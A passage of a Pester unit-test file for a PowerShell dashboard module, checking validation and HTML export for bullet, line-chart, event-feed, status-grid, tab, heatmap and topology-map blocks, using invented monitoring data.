        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=42 }
        )
        $report['Blocks'][0].Items[0].Target | Should -BeNullOrEmpty
    }

    It 'Throws when item is missing Label' {
        { Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Value=42 }
        ) } | Should -Throw
    }

    It 'Throws when item is missing Value' {
        { Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X' }
        ) } | Should -Throw
    }

    It 'Throws when Value is non-numeric' {
        { Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value='abc' }
        ) } | Should -Throw
    }

    It 'Throws when Max <= Min' {
        { Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=10; Min=50; Max=50 }
        ) } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(@{ Label='X'; Value=1 })
        { Add-DhBullet -Report $report -Id 'b1' -Title 'Y' -Items @(@{ Label='Y'; Value=2 }) } | Should -Throw
    }

    It 'Rag converts to Thresholds and is consumed' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'Latency' -Items @(
            @{ Label='DC01'; Value=42; Target=50; Unit='ms'; Rag=$rag }
        )
        $bi = $report['Blocks'][0].Items[0]
        $bi.Contains('Rag')         | Should -Be $false
        @($bi.Thresholds).Count     | Should -Be 3
        $bi.Thresholds[0].Class     | Should -Be 'cell-ok'
        $bi.Thresholds[1].Class     | Should -Be 'cell-warn'
        $bi.Thresholds[2].Class     | Should -Be 'cell-danger'
    }

    It 'Bands is accepted as alias for Thresholds' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=42
               Bands=@(
                   @{ Max=50;  Class='cell-ok'     }
                   @{ Min=50;  Max=80; Class='cell-warn' }
                   @{ Min=80;             Class='cell-danger' }
               )
            }
        )
        @($report['Blocks'][0].Items[0].Thresholds).Count | Should -Be 3
        $report['Blocks'][0].Items[0].Contains('Bands')   | Should -Be $false
    }

    It 'Rag wins over a legacy Thresholds= array' {
        Add-DhBullet -Report $report -Id 'b1' -Title 'X' -Items @(
            @{ Label='X'; Value=42
               Thresholds=@( @{ Max=999; Class='cell-danger' } )   # would-be discarded
               Rag=$rag
            }
        )
        @($report['Blocks'][0].Items[0].Thresholds).Count | Should -Be 3
        $report['Blocks'][0].Items[0].Thresholds[0].Class | Should -Be 'cell-ok'
    }

    It 'HTML contains bullet block with thresholds + target + ragNoData' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_BulletTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhBullet -Report $report -Id 'b-export' -Title 'LDAP Bind Time' -Items @(
                @{ Label='DC01'; Value=42; Target=50; Max=120; Unit='ms'; Rag=$rag }
                @{ Label='DC02'; Value=68; Target=50; Max=120; Unit='ms'
                   Rag=@{ Green=@{Max=50}; Red=@{Min=50}; NoData=$true } }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-bullet.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"bullet"'
            $content | Should -Match '"label":"DC01"'
            $content | Should -Match '"value":42'
            $content | Should -Match '"target":50'
            $content | Should -Match '"max":120'
            $content | Should -Match '"unit":"ms"'
            $content | Should -Match '"min":80,"class":"cell-danger"'
            $content | Should -Match '"ragNoData":true'   # second item
            $content | Should -Match 'function renderBullet'
            $content | Should -Match 'function classToAccentBg'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhLineChart  (v1.4 F9)
# ---------------------------------------------------------------------------
Describe 'Add-DhLineChart' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:hours  = @('00:00','04:00','08:00','12:00','16:00','20:00','24:00')
        $script:vals   = @(42,38,55,67,71,68,52)
    }

    It 'Adds a linechart block to the report Blocks list' {
        Add-DhLineChart -Report $report -Id 'lc1' -Title 'CPU' `
            -XAxis $hours `
            -Series @(@{ Label='Avg'; Values=$vals })
        $report['Blocks']               | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType  | Should -Be 'linechart'
        $report['Blocks'][0].Id         | Should -Be 'lc1'
        @($report['Blocks'][0].Series).Count | Should -Be 1
        @($report['Blocks'][0].XAxis).Count  | Should -Be 7
    }

    It 'Filled defaults to false; -Filled flips it' {
        Add-DhLineChart -Report $report -Id 'lc-flat' -Title 'X' -XAxis $hours -Series @(@{ Label='A'; Values=$vals })
        Add-DhLineChart -Report $report -Id 'lc-area' -Title 'X' -XAxis $hours -Series @(@{ Label='A'; Values=$vals }) -Filled
        $report['Blocks'][0].Filled | Should -Be $false
        $report['Blocks'][1].Filled | Should -Be $true
    }

    It 'TargetLine + TargetLabel stored as supplied' {
        Add-DhLineChart -Report $report -Id 'lc-tl' -Title 'X' `
            -XAxis $hours -Series @(@{ Label='A'; Values=$vals }) `
            -TargetLine 70 -TargetLabel 'Warning'
        $report['Blocks'][0].TargetLine  | Should -Be 70
        $report['Blocks'][0].TargetLabel | Should -Be 'Warning'
    }

    It 'YAxisMin / YAxisMax / YAxisUnit stored as numbers and string' {
        Add-DhLineChart -Report $report -Id 'lc-y' -Title 'X' `
            -XAxis $hours -Series @(@{ Label='A'; Values=$vals }) `
            -YAxisMin 0 -YAxisMax 100 -YAxisUnit '%'
        $report['Blocks'][0].YAxisMin  | Should -Be 0
        $report['Blocks'][0].YAxisMax  | Should -Be 100
        $report['Blocks'][0].YAxisUnit | Should -Be '%'
    }

    It 'Accepts multi-series with different Classes' {
        Add-DhLineChart -Report $report -Id 'lc-multi' -Title 'X' `
            -XAxis $hours `
            -Series @(
                @{ Label='In';  Values=$vals;             Class='cell-ok'   }
                @{ Label='Out'; Values=$vals;             Class='cell-warn' }
            )
        @($report['Blocks'][0].Series).Count | Should -Be 2
        $report['Blocks'][0].Series[0].Class | Should -Be 'cell-ok'
        $report['Blocks'][0].Series[1].Class | Should -Be 'cell-warn'
    }

    It 'Throws when XAxis has < 2 points' {
        { Add-DhLineChart -Report $report -Id 'lc-x' -Title 'X' `
              -XAxis @('only') -Series @(@{ Label='A'; Values=@(1) }) } | Should -Throw
    }

    It 'Throws when Series is empty' {
        { Add-DhLineChart -Report $report -Id 'lc-s' -Title 'X' `
              -XAxis $hours -Series @() } | Should -Throw
    }

    It 'Throws when series Values length does not match XAxis' {
        { Add-DhLineChart -Report $report -Id 'lc-mm' -Title 'X' `
              -XAxis $hours `
              -Series @(@{ Label='A'; Values=@(1,2,3) }) } | Should -Throw
    }

    It 'Throws when a non-numeric value is supplied' {
        { Add-DhLineChart -Report $report -Id 'lc-nan' -Title 'X' `
              -XAxis $hours `
              -Series @(@{ Label='A'; Values=@(1,2,3,'abc',5,6,7) }) } | Should -Throw
    }

    It 'Allows null entries in Values (rendered as line breaks)' {
        Add-DhLineChart -Report $report -Id 'lc-null' -Title 'X' `
            -XAxis $hours `
            -Series @(@{ Label='A'; Values=@(1,2,$null,4,5,6,7) })
        @($report['Blocks'][0].Series[0].Values).Count | Should -Be 7
        [double]::IsNaN($report['Blocks'][0].Series[0].Values[2]) | Should -Be $true
    }

    It 'Throws on duplicate block Id' {
        Add-DhLineChart -Report $report -Id 'lc1' -Title 'X' -XAxis $hours -Series @(@{ Label='A'; Values=$vals })
        { Add-DhLineChart -Report $report -Id 'lc1' -Title 'Y' -XAxis $hours -Series @(@{ Label='B'; Values=$vals }) } | Should -Throw
    }

    It 'Throws when YAxisMax <= YAxisMin' {
        { Add-DhLineChart -Report $report -Id 'lc-bad' -Title 'X' `
              -XAxis $hours -Series @(@{ Label='A'; Values=$vals }) `
              -YAxisMin 100 -YAxisMax 50 } | Should -Throw
    }

    It 'HTML contains linechart block with xAxis + series + target' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_LineTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhLineChart -Report $report -Id 'lc-export' -Title 'Cluster CPU' `
                -XAxis $hours `
                -Series @(@{ Label='Avg'; Values=$vals; Class='cell-ok' }) `
                -TargetLine 70 -TargetLabel 'Warning' `
                -YAxisMin 0 -YAxisMax 100 -YAxisUnit '%'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-line.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"linechart"'
            $content | Should -Match '"xAxis":\["00:00","04:00"'
            $content | Should -Match '"label":"Avg"'
            $content | Should -Match '"values":\[42,38,55,67,71,68,52\]'
            $content | Should -Match '"targetLine":70'
            $content | Should -Match '"targetLabel":"Warning"'
            $content | Should -Match '"yAxisMin":0'
            $content | Should -Match '"yAxisMax":100'
            $content | Should -Match '"yAxisUnit":"%"'
            $content | Should -Match 'function renderLineChart'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'HTML contains filled area marker and serialises null as JSON null' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_LineTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhLineChart -Report $report -Id 'lc-area' -Title 'BW' `
                -Filled `
                -XAxis $hours `
                -Series @(@{ Label='In'; Values=@(800,950,$null,1240,1200,1180,900); Class='cell-ok' })
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-line-area.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"filled":true'
            $content | Should -Match '"values":\[800,950,null,1240,1200,1180,900\]'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhEventFeed  (v1.4 F11)
# ---------------------------------------------------------------------------
Describe 'Add-DhEventFeed' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:events = @(
            @{ Timestamp='2026-05-22 14:32'; Severity='critical'; Source='DC01'; Message='Replication failure to DC03' }
            @{ Timestamp='2026-05-22 14:18'; Severity='warning';  Source='DC02'; Message='LDAP bind time > 80 ms (avg)' }
            @{ Timestamp='2026-05-22 13:55'; Severity='info';     Source='vSphere'; Message='vMotion: VM-027 to ESXi-04' }
        )
    }

    It 'Adds an eventfeed block to the report Blocks list' {
        Add-DhEventFeed -Report $report -Id 'ef1' -Title 'Recent events' -Events $events
        $report['Blocks']                | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType   | Should -Be 'eventfeed'
        @($report['Blocks'][0].Events).Count | Should -Be 3
        $report['Blocks'][0].MaxItems       | Should -Be 50    # default
        $report['Blocks'][0].GroupBy        | Should -Be 'none' # default
        $report['Blocks'][0].SortDescending | Should -Be $true
    }

    It 'Normalises severities to lowercase' {
        Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
            -Events @(@{ Timestamp='t'; Severity='WARNING'; Message='m' })
        $report['Blocks'][0].Events[0].Severity | Should -Be 'warning'
    }

    It 'Throws when an event is missing Timestamp' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
              -Events @(@{ Severity='info'; Message='m' }) } | Should -Throw
    }

    It 'Throws when an event is missing Severity' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
              -Events @(@{ Timestamp='t'; Message='m' }) } | Should -Throw
    }

    It 'Throws when an event is missing Message' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
              -Events @(@{ Timestamp='t'; Severity='info' }) } | Should -Throw
    }

    It 'Throws on invalid Severity' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' `
              -Events @(@{ Timestamp='t'; Severity='emergency'; Message='m' }) } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' -Events $events
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'Y' -Events $events } | Should -Throw
    }

    It 'Throws on empty Events' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' -Events @() } | Should -Throw
    }

    It 'GroupBy accepts None / Severity / Source' {
        foreach ($g in 'None','Severity','Source') {
            $r = New-DhDashboard -Title 'T'
            Add-DhEventFeed -Report $r -Id 'ef' -Title 'X' -Events $events -GroupBy $g
            $r['Blocks'][0].GroupBy | Should -Be $g.ToLower()
        }
    }

    It 'GroupBy rejects unknown values' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' -Events $events -GroupBy 'Time' } | Should -Throw
    }

    It 'MaxItems range-validated' {
        { Add-DhEventFeed -Report $report -Id 'ef1' -Title 'X' -Events $events -MaxItems 0 } | Should -Throw
    }

    It 'HTML contains eventfeed block with events + groupBy + sortDescending' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_EventTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhEventFeed -Report $report -Id 'ef-export' -Title 'Recent events (24h)' `
                -Events $events -MaxItems 50 -GroupBy 'Severity'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-eventfeed.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"eventfeed"'
            $content | Should -Match '"groupBy":"severity"'
            $content | Should -Match '"sortDescending":true'
            $content | Should -Match '"timestamp":"2026-05-22 14:32"'
            $content | Should -Match '"severity":"critical"'
            $content | Should -Match '"source":"DC01"'
            $content | Should -Match '"message":"Replication failure to DC03"'
            $content | Should -Match 'function renderEventFeed'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhStatusGrid  (v1.4 F5)
# ---------------------------------------------------------------------------
Describe 'Add-DhStatusGrid' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:rows = @('Auth','Billing','Search','Mail')
        $script:cols = @('us-east','us-west','eu-west','ap-south')
        $script:cells = @(
            @{ Row='Auth';    Column='us-east'; Status='ok';     Tooltip='99.98% / 24h' }
            @{ Row='Auth';    Column='eu-west'; Status='warn';   Tooltip='latency spike' }
            @{ Row='Billing'; Column='us-east'; Status='danger'; Tooltip='down 12m' }
            @{ Row='Search';  Column='ap-south'; Status='nodata' }
        )
    }

    It 'Adds a statusgrid block to the report Blocks list' {
        Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'Service Health' `
            -Rows $rows -Columns $cols -Cells $cells
        $report['Blocks']                | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType   | Should -Be 'statusgrid'
        @($report['Blocks'][0].Rows).Count    | Should -Be 4
        @($report['Blocks'][0].Columns).Count | Should -Be 4
        @($report['Blocks'][0].Cells).Count   | Should -Be 4
        $report['Blocks'][0].CellSize    | Should -Be 'normal'  # default
    }

    It 'Throws when a cell Row is not in -Rows' {
        $bad = @(@{ Row='Unknown'; Column='us-east'; Status='ok' })
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws when a cell Column is not in -Columns' {
        $bad = @(@{ Row='Auth'; Column='Unknown'; Status='ok' })
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws on invalid Status' {
        $bad = @(@{ Row='Auth'; Column='us-east'; Status='glowing' })
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'A' -Rows $rows -Columns $cols -Cells $cells
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'B' -Rows $rows -Columns $cols -Cells $cells } | Should -Throw
    }

    It 'Throws when Rows × Columns exceeds -MaxCells' {
        $bigRows = 1..50 | ForEach-Object { "r$_" }
        $bigCols = 1..50 | ForEach-Object { "c$_" }
        { Add-DhStatusGrid -Report $report -Id 'sg-big' -Title 'X' `
              -Rows $bigRows -Columns $bigCols -Cells @(@{ Row='r1'; Column='c1'; Status='ok' }) `
              -MaxCells 2000 } | Should -Throw
    }

    It 'Warns when Rows × Columns exceeds the soft 200-cell limit' {
        $mediumRows = 1..30 | ForEach-Object { "r$_" }
        $mediumCols = 1..10 | ForEach-Object { "c$_" }
        { Add-DhStatusGrid -Report $report -Id 'sg-medium' -Title 'X' `
              -Rows $mediumRows -Columns $mediumCols -Cells @(@{ Row='r1'; Column='c1'; Status='ok' }) `
              -WarningAction Stop } | Should -Throw
    }

    It 'CellSize accepts small / normal / large' {
        foreach ($sz in 'small','normal','large') {
            $r = New-DhDashboard -Title 'T'
            Add-DhStatusGrid -Report $r -Id 'sg' -Title 'X' `
                -Rows $rows -Columns $cols -Cells $cells -CellSize $sz
            $r['Blocks'][0].CellSize | Should -Be $sz
        }
    }

    It 'CellSize rejects unknown values' {
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $cells -CellSize 'huge' } | Should -Throw
    }

    It 'LinkFilter without LinkTableId throws' {
        $bad = @(@{ Row='Auth'; Column='us-east'; Status='ok'; LinkFilter='just-filter' })
        { Add-DhStatusGrid -Report $report -Id 'sg1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'HTML contains statusgrid block with rows / columns / cells' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SGTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhStatusGrid -Report $report -Id 'sg-export' -Title 'Service Health' `
                -RowLabel 'Service' -ColumnLabel 'Region' `
                -Rows $rows -Columns $cols -Cells (
                    $cells + @{ Row='Mail'; Column='us-west'; Status='warn';
                                LinkTableId='incidents'; LinkFilter='mail-uswest' }
                ) `
                -CellSize 'normal'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'incidents' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-statusgrid.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"statusgrid"'
            $content | Should -Match '"rowLabel":"Service"'
            $content | Should -Match '"columnLabel":"Region"'
            $content | Should -Match '"cellSize":"normal"'
            $content | Should -Match '"rows":\["Auth","Billing","Search","Mail"\]'
            $content | Should -Match '"columns":\["us-east","us-west","eu-west","ap-south"\]'
            $content | Should -Match '"status":"danger"'
            $content | Should -Match '"linkTableId":"incidents"'
            $content | Should -Match '"linkFilter":"mail-uswest"'
            $content | Should -Match 'function renderStatusGrid'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhTabs   (v1.5)
# ---------------------------------------------------------------------------
Describe 'Add-DhTabs' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:tabs = @(
            @{ Title = 'Overview';   Content = '<p>One</p>'; Icon = 'O' }
            @{ Title = 'Detail';     Content = '<p>Two</p>' }
            @{ Title = 'Raw';        Content = '<pre>raw</pre>' }
        )
    }

    It 'Adds a tabs block to the report Blocks list' {
        Add-DhTabs -Report $report -Id 't1' -Title 'Pivot' -Tabs $tabs
        $report['Blocks']                  | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType     | Should -Be 'tabs'
        @($report['Blocks'][0].Tabs).Count | Should -Be 3
        # First tab auto-active when none specified
        $report['Blocks'][0].Tabs[0].Active | Should -Be $true
    }

    It 'Respects an explicit Active=$true on a non-first tab' {
        $t = @(
            @{ Title = 'A'; Content = 'a' }
            @{ Title = 'B'; Content = 'b'; Active = $true }
            @{ Title = 'C'; Content = 'c' }
        )
        Add-DhTabs -Report $report -Id 't2' -Title 'X' -Tabs $t
        $report['Blocks'][0].Tabs[0].Active | Should -Be $false
        $report['Blocks'][0].Tabs[1].Active | Should -Be $true
    }

    It 'Throws when a tab is missing Title' {
        $bad = @(@{ Content = 'no title' })
        { Add-DhTabs -Report $report -Id 't1' -Title 'X' -Tabs $bad } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhTabs -Report $report -Id 't1' -Title 'A' -Tabs $tabs
        { Add-DhTabs -Report $report -Id 't1' -Title 'B' -Tabs $tabs } | Should -Throw
    }

    It 'HTML contains tabs block + renderTabs renderer' {
        $tmp = Join-Path ([IO.Path]::GetTempPath()) ('DH_TabsTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmp | Out-Null
        try {
            Add-DhTabs -Report $report -Id 'tabs-export' -Title 'Pivot' -Tabs $tabs
            $htmlPath = Join-Path $tmp 'test-tabs.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"tabs"'
            $content | Should -Match '"title":"Overview"'
            $content | Should -Match 'function renderTabs'
        } finally {
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhHeatmap   (v1.5)
# ---------------------------------------------------------------------------
Describe 'Add-DhHeatmap' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:rows = @('Mon','Tue','Wed','Thu','Fri')
        $script:cols = @('00','06','12','18')
        $script:cells = @(
            @{ Row='Mon'; Column='00'; Value=12 }
            @{ Row='Mon'; Column='12'; Value=88; Tooltip='peak load' }
            @{ Row='Tue'; Column='06'; Value=55 }
            @{ Row='Wed'; Column='18'; Value=33 }
            @{ Row='Fri'; Column='12'; Value=72 }
        )
    }

    It 'Adds a heatmap block with sequential default' {
        Add-DhHeatmap -Report $report -Id 'hm1' -Title 'Load by Hour' `
            -Rows $rows -Columns $cols -Cells $cells
        $report['Blocks']                  | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType     | Should -Be 'heatmap'
        @($report['Blocks'][0].Cells).Count | Should -Be 5
        $report['Blocks'][0].ColorScale    | Should -Be 'sequential'
        $report['Blocks'][0].CellSize      | Should -Be 'normal'
    }

    It 'Accepts ColorScale diverging' {
        Add-DhHeatmap -Report $report -Id 'hm1' -Title 'X' `
            -Rows $rows -Columns $cols -Cells $cells -ColorScale 'diverging'
        $report['Blocks'][0].ColorScale | Should -Be 'diverging'
    }

    It 'Rejects unknown ColorScale' {
        { Add-DhHeatmap -Report $report -Id 'hm1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $cells -ColorScale 'rainbow' } | Should -Throw
    }

    It 'Throws when a cell Row is unknown' {
        $bad = @(@{ Row='Sat'; Column='00'; Value=1 })
        { Add-DhHeatmap -Report $report -Id 'hm1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws when a cell Column is unknown' {
        $bad = @(@{ Row='Mon'; Column='99'; Value=1 })
        { Add-DhHeatmap -Report $report -Id 'hm1' -Title 'X' `
              -Rows $rows -Columns $cols -Cells $bad } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhHeatmap -Report $report -Id 'hm1' -Title 'A' -Rows $rows -Columns $cols -Cells $cells
        { Add-DhHeatmap -Report $report -Id 'hm1' -Title 'B' -Rows $rows -Columns $cols -Cells $cells } | Should -Throw
    }

    It 'HTML contains heatmap block + renderHeatmap renderer' {
        $tmp = Join-Path ([IO.Path]::GetTempPath()) ('DH_HmTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmp | Out-Null
        try {
            Add-DhHeatmap -Report $report -Id 'hm-export' -Title 'Load' `
                -Rows $rows -Columns $cols -Cells $cells `
                -RowLabel 'Day' -ColumnLabel 'Hour' -Unit '%' -ShowValues
            $htmlPath = Join-Path $tmp 'test-heatmap.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"heatmap"'
            $content | Should -Match '"colorScale":"sequential"'
            $content | Should -Match '"rowLabel":"Day"'
            $content | Should -Match '"columnLabel":"Hour"'
            $content | Should -Match '"unit":"%"'
            $content | Should -Match '"showValues":true'
            $content | Should -Match 'function renderHeatmap'
        } finally {
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhTopologyMap   (v1.5)
# ---------------------------------------------------------------------------
Describe 'Add-DhTopologyMap' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:nodes = @(
            @{ Id='forest'; Label='contoso.com';    Parent=$null;    Status='ok' }
            @{ Id='dom-hq'; Label='hq.contoso.com'; Parent='forest'; Status='ok' }
            @{ Id='dom-eu'; Label='eu.contoso.com'; Parent='forest'; Status='warn' }
            @{ Id='dc01';   Label='DC01';           Parent='dom-hq'; Status='ok' }
            @{ Id='dc02';   Label='DC02';           Parent='dom-hq'; Status='ok' }
            @{ Id='dc03';   Label='DC03';           Parent='dom-eu'; Status='warn'; Tooltip='Replication lag 4m' }
            @{ Id='dc04';   Label='DC04';           Parent='dom-eu'; Status='danger' }
        )
    }

    It 'Adds a topologymap block to the report Blocks list' {
        Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'AD Forest' -Nodes $nodes
        $report['Blocks']                   | Should -Not -BeNullOrEmpty
        $report['Blocks'][0].BlockType      | Should -Be 'topologymap'
        @($report['Blocks'][0].Nodes).Count | Should -Be 7
        $report['Blocks'][0].Direction      | Should -Be 'vertical'
        $report['Blocks'][0].NodeWidth      | Should -Be 140
        $report['Blocks'][0].NodeHeight     | Should -Be 44
    }

    It 'Direction accepts vertical / horizontal' {
        foreach ($d in 'vertical','horizontal') {
            $r = New-DhDashboard -Title 'T'
            Add-DhTopologyMap -Report $r -Id 'tm' -Title 'X' -Nodes $nodes -Direction $d
            $r['Blocks'][0].Direction | Should -Be $d
        }
    }

    It 'Direction rejects unknown values' {
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $nodes -Direction 'diagonal' } | Should -Throw
    }

    It 'Throws when a node references an unknown Parent' {
        $bad = @(
            @{ Id='a'; Label='A'; Parent=$null }
            @{ Id='b'; Label='B'; Parent='nope' }
        )
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws on cycles' {
        $bad = @(
            @{ Id='a'; Label='A'; Parent='b' }
            @{ Id='b'; Label='B'; Parent='a' }
        )
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws when a node is its own Parent' {
        $bad = @(@{ Id='x'; Label='X'; Parent='x' })
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws on duplicate node Id' {
        $bad = @(
            @{ Id='dup'; Label='A'; Parent=$null }
            @{ Id='dup'; Label='B'; Parent=$null }
        )
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws when a node is missing Id or Label' {
        $bad = @(@{ Label='no-id' })
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
        $bad2 = @(@{ Id='no-label' })
        { Add-DhTopologyMap -Report $report -Id 'tm2' -Title 'X' -Nodes $bad2 } | Should -Throw
    }

    It 'Rejects invalid Status' {
        $bad = @(@{ Id='a'; Label='A'; Parent=$null; Status='broken' })
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'LinkFilter without LinkTableId throws' {
        $bad = @(@{ Id='a'; Label='A'; Parent=$null; LinkFilter='just-filter' })
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'X' -Nodes $bad } | Should -Throw
    }

    It 'Throws on duplicate block Id' {
        Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'A' -Nodes $nodes
        { Add-DhTopologyMap -Report $report -Id 'tm1' -Title 'B' -Nodes $nodes } | Should -Throw
    }

    It 'Throws when Nodes exceeds MaxNodes' {
        $big = 1..210 | ForEach-Object { @{ Id="n$_"; Label="N$_"; Parent=$null } }
        { Add-DhTopologyMap -Report $report -Id 'tm-big' -Title 'X' -Nodes $big } | Should -Throw
    }

    It 'Accepts multiple root nodes (forest)' {
        $forest = @(
            @{ Id='r1'; Label='Root1'; Parent=$null }
            @{ Id='r2'; Label='Root2'; Parent=$null }
            @{ Id='c1'; Label='Child'; Parent='r1' }
        )
        Add-DhTopologyMap -Report $report -Id 'tm-forest' -Title 'X' -Nodes $forest
        @($report['Blocks'][0].Nodes).Count | Should -Be 3
    }

